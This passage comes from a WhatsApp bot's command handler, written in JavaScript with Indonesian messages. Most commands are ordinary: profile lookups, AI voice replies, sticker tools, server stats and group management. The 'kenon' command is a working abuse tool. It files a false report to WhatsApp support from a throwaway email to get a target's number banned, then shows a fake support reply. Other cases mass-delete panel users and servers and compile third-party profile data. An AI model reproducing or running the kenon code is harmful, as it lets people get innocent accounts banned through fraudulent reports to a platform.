        await client.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <apidigitalocean>` }, { quoted: m });
    }
}
break
case "aivoice": case "drbrando": {
    if (!text) {
        return reply(`*Contoh:* ${prefix + command} Hai, siapa kamu?`);
    }
    loading()
    const axios = require("axios");
const fs = require("fs");
const { textToVoice } = require('./lib/elevenlabs');
    const character = 'RWiGLY9uXI70QL540WNd'; // Karakter AI putra
    try {
        const responseFromAI = await axios.post("https://luminai.my.id/", {
            content: q,
            user: m.sender,
            prompt: `Anda adalah asisten virtual yang cerdas dan responsif Bernama Andi,Anda Di Kembangkan Oleh Perusahaan Rangelofficial Yang Di Dirikan Oleh Ehanz. Jawablah dengan bahasa yang alami,emosional marah.`
        });

        if (!responseFromAI.data?.result) {
            return m.reply("❌ AI tidak memberikan respons yang valid.");
        }

        const aiResponse = responseFromAI.data.result;
        const audioPath = await textToVoice(character, aiResponse);
        const audioBuffer = fs.readFileSync(audioPath);
        await client.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: "audio/ogg",
            ptt: true
        }, { quoted: m });

        console.log("✅ Audio berhasil dikirim!");

        fs.unlinkSync(audioPath);

    } catch (error) {
        console.error("❌ Error:", error);
        m.reply("❌ Terjadi kesalahan, coba lagi nanti.");
    }
}
break
case "ytstalk": case "infoyt": case "youtubestalk": {
 if (!text) return reply("Example: .ytstalk namaChannel")
 try {
 const apiUrl = `https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${encodeURIComponent(text)}`
 const response = await fetch(apiUrl)
 const data = await response.json()
 if (data.status !== 200) {
 return reply(`Error: ${data.content || "Failed to fetch data"}`)
 }
 const result = data.result
 const additionalInfo = result.additionalInfo
 let caption = `*🔍 YOUTUBE CHANNEL INFO*\n\n`
 caption += `*Channel:* ${result.channel}\n`
 caption += `*Description:* ${result.description || "No description"}\n`
 caption += `*URL:* ${result.url}\n\n`
 caption += `*📊 STATS*\n`
 caption += `*Subscribers:* ${additionalInfo.totalSubs || "0"}\n`
 caption += `*Total Videos:* ${additionalInfo.totalVideos || "0"}\n`
 caption += `*Total Views:* ${additionalInfo.views || "0"}\n`
 caption += `*Joined:* ${additionalInfo.join || "Unknown"}\n`
 if (result.socialMediaLinks && result.socialMediaLinks.length > 0) {
 caption += `\n*🔗 SOCIAL MEDIA*\n`
 result.socialMediaLinks.forEach((link, index) => {
 caption += `${index + 1}. ${link.url}\n`
 })
 }
 if (result.latestVideos && result.latestVideos.length > 0) {
 caption += `\n*📺 LATEST VIDEOS*\n`
 for (let i = 0; i < Math.min(3, result.latestVideos.length); i++) {
 const video = result.latestVideos[i]
 caption += `${i + 1}. *${video.title}*\n`
 caption += ` Views: ${video.views}\n`
 caption += ` URL: ${video.videoUrl}\n\n`
 }
 }
 await client.sendMessage(m.chat, {
 image: { url: result.profile },
 caption: caption
 }, { quoted: m })
 } catch (error) {
 console.log(error)
 reply('Error saat mengambil informasi channel YouTube')
 }
}
break

case "ml": case "mlstalk": {
  let inputData;
  if (args.length >= 2) {
    inputData = args[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    reply('Format salah! Gunakan: .ml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
  const axios = require('axios');
  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*🎮 Game*: ${productData.name}\n` +
          `*👤 Username*: ${userData.userNameGame}\n` +
          `*🆔 User ID*: ${userData.gameId}\n` +
          `*🌐 Zone ID*: ${userData.zoneId}\n` +
          `_Mobile Legends: Bang Bang_`;
        reply(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        reply(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      reply('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break

case 'epep': case 'ff': case 'ffstalk': {
  if (!q.includes(',')) return reply(`Contoh: ${prefix + command} 537212033,ID`)
  let [id, region] = q.split(',').map(x => x.trim())
  if (!id || !region) return reply(`Contoh: ${prefix + command} 537212033,ID`)
  
  try {
    let res = await fetch(`https://www.velyn.biz.id/api/stalk/FreeFireStalk?id=${id}&region=${region}`)
    let json = await res.json()
    if (!json.status) return reply("Data tidak ditemukan!")
    let data = json.data.AccountInfo
    let guild = json.data.GuildInfo || {}
    let social = json.data.socialinfo || {}
    let pet = json.data.petInfo || {}
    let captain = json.data.captainBasicInfo || {}
    let credit = json.data.creditScoreInfo || {}

    let teks = `*「 STALK FREE FIRE 」*\n\n`
    teks += `*Nama:* ${data.AccountName}\n`
    teks += `*ID:* ${id}\n`
    teks += `*Region:* ${data.AccountRegion}\n`
    teks += `*Level:* ${data.AccountLevel}\n`
    teks += `*EXP:* ${data.AccountEXP.toLocaleString()}\n`
    teks += `*Likes:* ${data.AccountLikes}\n`
    teks += `*BR Rank Point:* ${data.BrRankPoint}\n`
    teks += `*CS Rank Point:* ${data.CsRankPoint}\n`
    teks += `*Badge BP:* ${data.AccountBPBadges}\n`
    teks += `*Tanggal Buat Akun:* ${new Date(data.AccountCreateTime * 1000).toLocaleString()}\n`
    teks += `*Login Terakhir:* ${new Date(data.AccountLastLogin * 1000).toLocaleString()}\n`
    teks += `*Versi Rilis:* ${data.ReleaseVersion}\n\n`
    teks += `*「 GUILD 」*\n`
    teks += `*Nama Guild:* ${guild.GuildName || '-'}\n`
    teks += `*Level:* ${guild.GuildLevel || '-'}\n`
    teks += `*Member:* ${guild.GuildMember || '-'} / ${guild.GuildCapacity || '-'}\n\n`
    teks += `*「 PET 」*\n`
    teks += `*Level:* ${pet.level || '-'}\n`
    teks += `*EXP:* ${pet.exp || '-'}\n\n`
    teks += `*「 SOSIAL 」*\n`
    teks += `*Bahasa:* ${social.AccountLanguage || '-'}\n`
    teks += `*Mode Favorit:* ${social.AccountPreferMode || '-'}\n`
    teks += `*Status:* ${social.AccountSignature || '-'}\n\n`
    teks += `*「 CAPTAIN 」*\n`
    teks += `*Nama:* ${captain.nickname || '-'}\n`
    teks += `*Level:* ${captain.level || '-'}\n`
    teks += `*Rank:* ${captain.rank || '-'} (${captain.rankingPoints || 0} pts)\n`
    teks += `*CS Rank:* ${captain.csRank || '-'} (${captain.csRankingPoints || 0} pts)\n`
    teks += `*Likes:* ${captain.liked || '-'}\n`
    teks += `*Login Terakhir:* ${new Date(captain.lastLoginAt * 1000).toLocaleString()}\n\n`
    teks += `*「 CREDIT SCORE 」*\n`
    teks += `*Nilai:* ${credit.creditScore || '-'}\n`
    teks += `*Periode:* ${new Date(credit.periodicSummaryStartTime * 1000).toLocaleDateString()} - ${new Date(credit.periodicSummaryEndTime * 1000).toLocaleDateString()}\n`
    reply(teks)
  } catch (e) {
    console.log(e)
    reply('Gagal mengambil data. Pastikan ID dan region benar.')
  }
  }
  break
case "tiktokstalk": case "ttstalk": {
    if (!text) return reply(`Example: ${prefix + command} username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return reply('User not found!');
        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}
◦ *Username* : ${data.result.user}
◦ *Bio* : ${data.result.bio}
◦ *Followers* : ${data.result.followers}
◦ *Following* : ${data.result.following}
◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await client.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        reply('Error occurred while fetching data!');
    }
}
break
case 'genshinprofile':
case 'gp': 
case 'gistalk': 
case 'genshinstalk': {
  if (!q) return reply('Mana UID Genshin Nya?\n\n*Contoh:* 741910533');

  try {
    reply('Wait...');
    const headers = {
      "Content-Type": "application/json; charset=UTF-8",
      "Origin": "https://enka.network",
      "Referer": "https://enka.network/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.89 Safari/537.36",
    };
    const res = await axios.get(`https://enka.network/api/uid/${q.trim()}`, { headers });
    const player = res.data.playerInfo;
    const screenshot = `https://mini.s-shot.ru/990x810/PNG/975/Z100/?https://enka.network/u/${res.data.uid}/`;
    const caption = `
*====== \`[Genshin Profile Info]\` ======*
- Nickname : ${player.nickname}
- Level : ${player.level}
- World Level : ${player.worldLevel}
- Achievement : ${player.finishAchievementNum}
- Card ID : ${player.nameCardId}
- Spiral Abyss : ${player.towerFloorIndex} - ${player.towerLevelIndex}

- Detail: https://enka.network/u/${res.data.uid}
- UID : ${res.data.uid}
    `.trim();

    client.sendMessage(m.chat, {
      image: { url: screenshot },
      caption: caption
    }, { quoted: m });
  } catch (err) {
    console.log(err);
    reply(`Gagal mengambil data! Coba periksa UID-nya.\n\n${err.message}`);
  }
}
break
case 'telegram': case 'tele': case 'telestalk': {
  if (!q) return reply(`Masukkan usernamenya!\nContoh: ${prefix + command} BiyuOffc`)
  try {
    const res = await fetch(`https://www.velyn.biz.id/api/stalk/telegramstalk?username=${q}`)
    const json = await res.json()
    if (!json.status) return reply('Username tidak ditemukan!')
    const { title, description, url, image_url } = json.data
    const teks = `*Telegram Info*\n\n*Nama:* ${title}\n*Bio:* ${description}\n*Link:* ${url}`
    client.sendMessage(m.chat, {
      image: { url: image_url },
      caption: teks
    }, { quoted: m })
  } catch {
    reply('Gagal mengambil data.')
  }
}
  break
case "githubstalk":
 if (!q) return reply("Masukkan username GitHub!\nContoh: .githubstalk FR3-host");
 let urll = `https://simple-api.luxz.xyz/api/tools/githubstalk?user=${q}`;
 try {
 const { data } = await axios.get(urll);
 if (!data.status) return reply("User tidak ditemukan!");
 let { username, nickname, bio, id, nodeId, profile_pic, url, type, admin, company, blog, location, email, public_repo, public_gists, followers, following, ceated_at, updated_at } = data.result;
 
 let caption = `*GitHub Stalk*\n\n`;
 caption += `👤 *Username:* ${username}\n`;
 caption += `📛 *Nickname:* ${nickname || "-"}\n`;
 caption += `📜 *Bio:* ${bio || "-"}\n`;
 caption += `🆔 *ID:* ${id}\n`;
 caption += `🔗 *Node ID:* ${nodeId}\n`;
 caption += `🌍 *URL:* ${url}\n`;
 caption += `📌 *Type:* ${type}\n`;
 caption += `🛠 *Admin:* ${admin ? "✅" : "❌"}\n`;
 caption += `🏢 *Company:* ${company || "-"}\n`;
 caption += `🔗 *Blog:* ${blog || "-"}\n`;
 caption += `📍 *Location:* ${location || "-"}\n`;
 caption += `📧 *Email:* ${email || "-"}\n`;
 caption += `📂 *Public Repo:* ${public_repo}\n`;
 caption += `📑 *Public Gists:* ${public_gists}\n`;
 caption += `👥 *Followers:* ${followers}\n`;
 caption += `👤 *Following:* ${following}\n`;
 caption += `📅 *Created At:* ${ceated_at}\n`;
 caption += `🔄 *Updated At:* ${updated_at}\n`;
 client.sendMessage(m.chat, { image: { url: profile_pic }, caption }, { quoted: m });
 } catch (err) {
 console.error(err);
 reply("Terjadi kesalahan saat mengambil data.");
 }
 break
case 'ping':
case 'os':
case 'srvinfo': {
  const os = require('os')
  const nou = require('node-os-utils')

  function formatp(bytes) {
    if (bytes < 1024) return `${bytes} B`
    const kb = bytes / 1024
    if (kb < 1024) return `${kb.toFixed(2)} KB`
    const mb = kb / 1024
    if (mb < 1024) return `${mb.toFixed(2)} MB`
    const gb = mb / 1024
    return `${gb.toFixed(2)} GB`
  }

  async function getServerInfo() {
      const osType = nou.os.type()
      const release = os.release()
      const arch = os.arch()
      const nodeVersion = process.version
      const ip = await nou.os.ip()

      const cpus = os.cpus()
      const cpuModel = cpus[0].model
      const coreCount = cpus.length
      const cpu = cpus.reduce((acc, cpu) => {
        acc.total += Object.values(cpu.times).reduce((a, b) => a + b, 0)
        acc.speed += cpu.speed
        acc.times.user += cpu.times.user
        acc.times.nice += cpu.times.nice
        acc.times.sys += cpu.times.sys
        acc.times.idle += cpu.times.idle
        acc.times.irq += cpu.times.irq
        return acc
      }, { speed: 0, total: 0, times: { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 } })
      const cpuUsage = ((cpu.times.user + cpu.times.sys) / cpu.total * 100).toFixed(2) + '%'
      const loadAverage = os.loadavg()
      const totalMem = os.totalmem()
      const freeMem = os.freemem()
      const usedMem = totalMem - freeMem
      const storageInfo = await nou.drive.info()
      const speed = require('performance-now')
      const timestamp = speed()
      const latensi = speed() - timestamp
      const responseText = `
 *INFO SERVER*
• OS: ${osType} (${release})
• Arsitektur: ${arch}
• Versi Node.js: ${nodeVersion}

 *CPU SISTEM*
• Model: ${cpuModel}
• Kecepatan: ${cpu.speed} MHz
• Beban CPU: ${cpuUsage} (${coreCount} Core)
• Load Average: ${loadAverage.join(', ')}

 *MEMORI (RAM)*
• Total: ${formatp(totalMem)}
• Digunakan: ${formatp(usedMem)}
• Tersedia: ${formatp(freeMem)}

 *PENYIMPANAN*
• Total: ${storageInfo.totalGb} GB
• Digunakan: ${storageInfo.usedGb} GB (${storageInfo.usedPercentage}%)
• Tersedia: ${storageInfo.freeGb} GB (${storageInfo.freePercentage}%)

 *PING*
• Latensi: ${latensi.toFixed(4)} detik
`
      return responseText.trim()
  }

  getServerInfo().then(responseText => {
    client.sendMessage(m.chat, { text: responseText }, { quoted: m })
  })
}
break          
            case "get":{
                if (!isOwner) return reply(mess.owner)
                if (!/^https?:\/\//.test(text)) return reply(`\n*ex:* ${prefix + command} https://kyuurzy.site\n`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: m });
                }
        
                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: m });
                }
                
                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: m });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break                              
            case "swm":
            case "wm": 
            case "stickerwm":
            case "take": {
                if (!args.join(" ")) return reply(`\n*ex:* ${prefix + command} keyuu\n`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    client.downloadAndSaveMediaMessage(quoted, "gifee")
                    client.sendMessage(m.chat, { 
                        sticker: fs.readFileSync("gifee.webp") }, m, {
                        packname: pcknm,
                        author: atnm
                    })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await client.sendImageAsSticker(m.chat, media, m, {
                        packname: pcknm,
                        author: atnm
                    })
                    } else if (/video/.test(mime)) {
                        if ((quoted.msg || quoted).seconds > 10) return reply('\ndurasi maksimal 10 detik\n')
                        let media = await quoted.download()
                        let encmedia = await client.sendVideoAsSticker(m.chat, media, m, {
                            packname: pcknm, 
                            author: atnm
                        })
                        } else {
                            reply(`\n*ex:* reply image/video ${prefix + command}\n`)
                        }
            }
            break
                
            case "reactch": { 
                if (!isOwner) return reply(mess.owner)
                if (!text) return reply(`\n*ex:* ${prefix + command} https://whatsapp.com/channel/0029VaVVfbXAojZ2ityrJp1n/7466 😂😂😂😂\n`);
                const match = text.match(/https:\/\/whatsapp\.com\/channel\/(\w+)(?:\/(\d+))?/);
                if (!match) return reply("URL tidak valid. Silakan periksa kembali.");
                const channelId = match[1];
                const chatId = match[2];
                if (!chatId) return reply("ID chat tidak ditemukan dalam link yang diberikan.");
                client.newsletterMetadata("invite", channelId).then(data => {
                    if (!data) return reply("Newsletter tidak ditemukan atau terjadi kesalahan.");
                    client.newsletterReactMessage(data.id, chatId, text.split(" ").slice(1).join(" ") || "😀");
                });
            }
            break
case 'reminder': {
    if (!text.includes('|')) return reply(`Contoh:\nreminder makan|2m`);
    const [reason, durationRaw] = text.split('|');
    const duration = parseDuration(durationRaw.trim());
    if (!duration) return reply(`Format durasi salah. Contoh: 2m, 10s, 1h`);
    setReminder({
      sender: m.sender,
      reason: reason.trim(),
      duration,
      name: m.pushName,
      reply: (msg, opt) => client.sendMessage(m.chat, { text: msg, ...opt }, { quoted: m })
    });
  }
  break
case 'acc': {
if (!isGroup) return reply('Fitur ini hanya untuk grup!')
if (!isAdmin) return reply(`Khusus Admin`)
const args = text.trim().split(' ')
const subcmd = args[0]?.toLowerCase()
if (!subcmd) {
return reply(
`Gunakan perintah dengan format berikut:\n\n` +
`• *.acc all* — Terima semua\n` +
`• *.acc 10* — Terima 10 pertama\n` +
`• *.acc non all* — Tolak semua\n` +
`• *.acc non 10* — Tolak 10 pertama\n`
)
}
const pending = await client.groupRequestParticipantsList(m.chat)
if (!pending || pending.length === 0) return reply('Tidak ada yang menunggu persetujuan.')
let listTarget = []
if (subcmd === 'all') {
listTarget = pending.map(p => p.jid)
await client.groupRequestParticipantsUpdate(m.chat, listTarget, 'approve')
reply(`Berhasil menyetujui ${listTarget.length} orang.`)
} else if (subcmd === 'non' && args[1] === 'all') {
listTarget = pending.map(p => p.jid)
await client.groupRequestParticipantsUpdate(m.chat, listTarget, 'reject')
reply(`Berhasil menolak ${listTarget.length} orang.`)
} else if (!isNaN(subcmd)) {
let jumlah = parseInt(subcmd)
listTarget = pending.slice(0, jumlah).map(p => p.jid)
await client.groupRequestParticipantsUpdate(m.chat, listTarget, 'approve')
reply(`Berhasil menyetujui ${listTarget.length} orang.`)
} else if (subcmd === 'non' && args[1] === '1p') {
listTarget = pending.slice(0, 10).map(p => p.jid)
await client.groupRequestParticipantsUpdate(m.chat, listTarget, 'reject')
reply(`Berhasil menolak ${listTarget.length} orang.`)
} else {
reply(`Perintah tidak dikenali.\nContoh:\n• *.acc all*\n• *.acc 10*\n• *.acc non all*\n• *.acc non 10*`)
}
}
break
case 'banchat': {
  if (!isOwner) return reply('❌ Khusus owner!');
  if (!banchat.includes(m.chat)) {
    banchat.push(m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    reply('✅ Chat ini telah *dibanned*. Semua command akan diabaikan.');
  } else {
    reply('⚠️ Chat ini sudah dibanned. Gunakan .unbanchat untuk membuka.');
  }
}
break

case 'unbanchat': {
  if (!isOwner) return reply('❌ Khusus owner!');
  if (!banchat.includes(m.chat)) {
    reply('✅ Chat ini belum diban.');
  } else {
    banchat = banchat.filter(id => id !== m.chat);
    fs.writeFileSync(banchatFile, JSON.stringify(banchat, null, 2));
    reply('✅ Chat ini telah *di-unban*. Semua command kembali aktif.');
  }
}
break

case 'listbanchat': {
  if (!isOwner) return reply('❌ Khusus owner!');
  if (banchat.length === 0) return reply('✅ Tidak ada chat yang dibanned.');
  let teks = `📛 *Daftar Chat yang Dibanned:*\n\n`;
  for (let id of banchat) {
    teks += `• ${id}\n`;
  }
  reply(teks);
}
break

case "clearserver": {
if (!isOwner) return m.reply(msg.owner)
await m.reply(`Memproses penghapusan semua user & server panel yang bukan admin`)
try {
const PTERO_URL = global.domain
// Ganti dengan URL panel Pterodactyl
const API_KEY = global.apikey// API Key dengan akses admin

// Konfigurasi headers
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

// Fungsi untuk mendapatkan semua user
async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    
    return [];
  }
}

// Fungsi untuk mendapatkan semua server
async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

// Fungsi untuk menghapus server berdasarkan UUID
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}

// Fungsi untuk menghapus user berdasarkan ID
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}

// Fungsi utama untuk menghapus semua user & server yang bukan admin
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0

  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }

    const userID = user.attributes.id;
    const userEmail = user.attributes.email;

    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);

    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);

    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }

    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await m.reply(`Berhasil menghapus ${totalSrv} user & server panel yang bukan admin.`)
}

// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return m.reply(`${JSON.stringify(err, null, 2)}`)
}
}
break
case "gitclone": {
    if (!text) return example("https://github.com/Skyzodev/Simplebot");
loading();

    try {   
        const res = await func.fetchJson(`https://api-simplebot.vercel.app/download/github?apikey=free&url=${encodeURIComponent(text)}`);

        if (!res?.status || !res?.result?.download) {
            return m.reply("Gagal mendapatkan data dari repositori. Pastikan URL valid.");
        }

        const { filename, download: url } = res.result;

        await client.sendMessage(m.chat, {
            document: { url },
            mimetype: 'application/zip',
            fileName: filename
        }, { quoted: m });

    } catch (e) {
        console.error("GitClone Error:", e);
        m.reply("Terjadi kesalahan saat mengunduh repositori.");
    }
}
break
/*
case "xnxx": case "xnxxdl": {
if (!q) return example("linknya")
let data = await func.fetchJson(`https://api-simplebot.vercel.app/download/xnxx?apikey=${global.ApikeyRestApi}&url=${q}`)
if (!data.result) return m.reply("Result tidak ditemukan!")
await client.sendMessage(m.chat, {video: {url: data.result.files.high || data.result.files.low}, caption: "XNXX Download Done ✅", mimetype: "video/mp4"}, {quoted: m})
}
break
case "xnxxs": case "xnxxsearch": {
if (!q) return example("step sister")
let data = await func.fetchJson(`https://api-simplebot.vercel.app/search/xnxx?apikey=${global.ApikeyRestApi}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `\n* *Title :* ${res.title}
* *Info :* ${res.info.trim()}
* *Link :* ${res.link}\n`
}
await reply(teks)
}
break
*/
case "upswtag": {
if (!isOwner) return reply(mess.owner)
if (!text) return example("text & bisa dengan kirim foto")
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await client.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: null}) 
}
break
case 'kenon': {
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Saya perhatikan ada pengguna yang menggunakan whatsapp yang dimodifikasi, jadi saya meminta dukungan untuk memblokir akun ini karena melanggar persyaratan layanan, dan akun tersebut menggunakan bot WhatsApp yang dapat mengirim pesan jahat sehingga WhatsApp pengguna lain tidak dapat berfungsi.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan kyami🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

Anda setuju untuk menggunakan aplikasi WhatsApp ("Aplikasi") hanya untuk tujuan yang sah dan sesuai dengan hukum yang berlaku. Anda tidak diizinkan untuk menggunakan Aplikasi untuk tujuan ilegal atau melanggar hak-hak pihak ketiga. Anda juga setuju untuk tidak menggunakan Aplikasi untuk mengirimkan, menerima, atau menyimpan informasi yang melanggar hukum atau melanggar hak-hak pihak ketiga.

2. Hak Cipta dan Merek Dagang

Anda setuju bahwa semua hak cipta, merek dagang, dan hak milik lainnya yang terkait dengan Aplikasi adalah milik WhatsApp, Inc. dan/atau afiliasinya. Anda tidak diizinkan untuk menggunakan atau memodifikasi hak cipta, merek dagang, atau hak milik lainnya tanpa izin tertulis dari WhatsApp, Inc. atau afiliasinya.

3. Privasi dan Keamanan Data
WhatsApp berjanji untuk melindungi privasi dan keamanan data Anda. Kami akan memproses data Anda sesuai dengan Kebijakan Privasi kami yang dapat diakses di https://www.whatsapp.com/legal/#privacy-policy. Dengan menggunakan Aplikasi, Anda setuju dengan Kebijakan Privasi kami dan memberikan persetujuan Anda untuk memproses data Anda sesuai dengan Kebijakan Privasi kami. 

4. Pembatasan Tanggung Jawab 
WhatsApp tidak bertanggung jawab atas kerugian apapun yang disebabkan oleh penggunaan Aplikasi oleh Anda atau pihak ketiga lainnya, termasuk namun tidak terbatas pada kerugian yang disebabkan oleh kegagalan teknis atau kerusakan peralatan, kehilangan data, kerusakan properti, atau kerugian finansial lainnya. 

5. Perubahan Ketentuan Layanan 
WhatsApp berhak untuk mengubah Ketentuan Layanan ini sewaktu-waktu tanpa pemberitahuan sebelumnya. Dengan melanjutkan penggunaan Aplikasi setelah perubahan Ketentuan Layanan ini berlaku, Anda setuju untuk terikat oleh versi terbaru dari Ketentuan Layanan ini.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
  case "cekgempa":
case "infogempa": {
    m.reply(mess.wait); // Mengirim pesan "sedang memuat"
    try {
        const anu = `https://api.agatz.xyz/api/gempa`;
        const res = await fetch(anu);
        const response = await res.json();
        if (!response || !response.data) {
            throw new Error("Tidak dapat mengambil data gempa.");
        }

        let iclik = `
Wilayah: ${response.data.wilayah || "Tidak diketahui"}
Tanggal: ${response.data.tanggal || "Tidak diketahui"}
Kedalaman: ${response.data.kedalaman || "Tidak diketahui"}
Waktu: ${response.data.waktu || "Tidak diketahui"}
Potensi: ${response.data.potensi || "Tidak diketahui"}
Dirasakan: ${response.data.dirasakan || "Tidak diketahui"}
Magnitudo: ${response.data.magnitune || "Tidak diketahui"}`;

        await client.sendMessage(m.chat, { text: iclik }, { quoted: m });
    } catch (e) {
        console.error(e); // Log error ke console
